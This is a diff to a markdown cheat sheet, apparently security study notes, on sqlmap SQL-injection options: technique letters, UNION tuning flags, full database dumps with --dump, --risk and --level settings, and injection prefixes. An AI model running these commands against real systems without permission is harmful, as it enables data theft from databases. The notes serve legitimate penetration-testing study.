@@ -405,7 +405,8 @@ The technique characters `BEUSTQ` refers to the following:
 - `S`: Stacked queries
 - `T`: Time-based blind
 - `Q`: Inline queries
-  
+--union-cols=17 --union-char='a' --union-from=users # Specify to assist in UNION query-based SQLi
+
 # Run SQLMap without asking for user input. Use `--dump` to dump ALL data!
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch --dump
 
@@ -432,10 +433,10 @@ sqlmap -u www.target.com --data='id=1' --method PUT
 # Force sqlmap to use `OR` payloads with `--risk=3`
 sqlmap -r req.txt --batch --dump --risk=3
 
-# Force sqlmap to test more boundaries `--level=5`
-sqlmap -r req.txt --batch --dump --level=5 --risk=3
+# Force sqlmap to test more boundaries `--level=5`. Helps determine the prefix to use.
+sqlmap -r req.txt --level=5 -v 3
 
-# Specifying a prefix or suffix
+# Specifying a prefix or suffix. Test different payloads wotfor correct prefix
 sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
 
 # Basic DB enumeration
